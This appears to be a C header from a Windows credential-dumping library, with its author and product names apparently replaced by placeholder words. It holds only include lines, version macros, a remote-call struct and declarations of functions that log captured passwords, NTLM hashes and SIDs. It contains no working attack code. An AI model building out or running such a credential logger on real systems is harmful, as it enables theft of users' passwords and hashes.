/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <ntsecapi.h>
#include <sspi.h>
#include <sddl.h>
#include <wincred.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <stdio.h>

#if defined(_M_ARM64)
	#define programa_ARCH_A "arm64"
#elif defined(_M_X64)
	#define programa_ARCH_A "x64"
#elif defined(_M_IX86)
	#define programa_ARCH_A "x86"
#endif

#define programa_A				"programa"
#define programa_VERSION_A		"2.2.0"
#define programa_CODENAME_A		"A La Vie, A L\'Amour"
#define programa_FULL_A			programa_A " " programa_VERSION_A " (" programa_ARCH_A ") built on " __DATE__ " " __TIME__
#define programa_SECOND_A		"\"" programa_CODENAME_A "\""

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define LM_NTLM_HASH_LENGTH	16

void klog(FILE * logfile, PCWCHAR format, ...);
void klog_password(FILE * logfile, PUNICODE_STRING pPassword);
void klog_hash(FILE * logfile, PUNICODE_STRING pHash, BOOLEAN withSpace);
void klog_sid(FILE * logfile, PSID pSid);

typedef struct _REMOTE_LIB_FUNC {
	DWORD	outputSize;
	PVOID	outputData;
	DWORD	inputSize;
	BYTE	inputData[ANYSIZE_ARRAY];
} REMOTE_LIB_FUNC, *PREMOTE_LIB_FUNC;